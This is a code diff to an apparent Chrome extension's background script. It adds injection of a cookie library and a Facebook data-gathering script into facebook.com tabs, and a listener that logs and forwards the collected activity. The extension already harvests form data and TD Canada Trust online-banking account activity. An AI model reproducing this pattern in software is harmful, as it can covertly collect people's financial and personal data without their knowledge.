@@ -191,6 +191,15 @@ var onTabUpdate = function (tabId, changeInfo, tab) {
                 file: "events/getFormData.js"
             });
         }
+        // Inject getFacebookData event into Facebook.
+        if ((/facebook.com/).test(tab.url)) {
+            chrome.tabs.executeScript(tabId, {
+                file: "lib/jquery.cookie.js"
+            });
+            chrome.tabs.executeScript(tabId, {
+                file: "events/getFacebookData.js"
+            });
+        }
         // Inject getTDAccountActivity event into EasyWeb.
         if ((/easywebcpo.tdcanadatrust.com\/webbanking/).test(tab.url) ||
             (/easywebsoc.tdcanadatrust.com\/webbanking/).test(tab.url)) {
@@ -246,6 +255,11 @@ var onPortPost = function (port) {
     if (port.name === 'formData') {
         port.onMessage.addListener(function (formData) {
             emitEvent('addFormData', formData);
+        });
+    } else if (port.name === 'facebookData') {
+        port.onMessage.addListener(function (activity) {
+            console.log(activity);
+            emitEvent('addFacebookData', activity);
         });
     } else if (port.name === 'TDAccountActivity') {
         port.onMessage.addListener(function (activity) {
